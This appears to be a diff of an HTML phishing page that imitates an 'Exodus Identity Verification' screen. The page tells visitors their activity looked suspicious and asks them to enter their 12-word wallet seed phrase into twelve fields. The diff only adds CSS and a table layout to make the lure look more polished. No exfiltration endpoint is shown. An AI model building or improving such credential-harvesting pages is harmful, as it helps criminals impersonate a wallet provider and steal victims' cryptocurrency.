@@ -2,23 +2,59 @@
 <html>
 <head>
     <title>Exodus Identity Verification</title>
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 10px;
+            text-align: center;
+        }
+        
+        input {
+            width: 90%; /* Adjust this value as needed */
+            padding: 5px;
+            box-sizing: border-box;
+            margin-bottom: 5px;
+        }
+        
+        button {
+            padding: 10px;
+        }
+    </style>
 </head>
 <body>
     <h1>Identity Verification</h1>
-   <b> <p>You have been redirected because your activity seemed suspicious. Please verify your identity by entering your 12-word seed phrase:</p> </b>
+    <p>You have been redirected because your activity seemed suspicious. Please verify your identity by entering your 12-word seed phrase:</p>
     <form>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
-        <input type="text" maxlength="4" pattern="[a-zA-Z]+" required>
+        <table>
+            <tr>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+            </tr>
+            <tr>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+            </tr>
+            <tr>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+            </tr>
+            <tr>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+            </tr>
+            <tr>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+            </tr>
+            <tr>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+                <td><input type="text" maxlength="4" pattern="[a-zA-Z]+" required></td>
+            </tr>
+        </table>
         <button type="submit">Verify</button>
     </form>
 </body>
